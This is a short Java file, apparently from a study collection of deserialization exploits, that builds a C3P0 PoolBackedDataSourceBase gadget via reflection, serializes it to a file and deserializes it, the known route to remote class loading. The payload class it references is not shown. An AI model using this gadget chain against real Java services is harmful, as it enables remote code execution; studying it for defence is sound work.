package Seri.C3p0;

import Seri.Utils;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
//import com.mchange.v2.c3p0.JndiRefForwardingDataSource;

import java.lang.reflect.Field;

public class RemoteURLClassLoader {
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class clazz = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        //此类是PoolBackedDataSourceBase抽象类的实现
        Field f1 = clazz.getDeclaredField("connectionPoolDataSource");
        f1.setAccessible(true);
        f1.set(poolBackedDataSourceBase,new extendImpl());

//        JndiRefDataSourceBase

        Utils.serialize(poolBackedDataSourceBase ,"bin/C3p0JNDI.bin");
        Utils.unserialize("bin/C3p0JNDI.bin");




    }
}

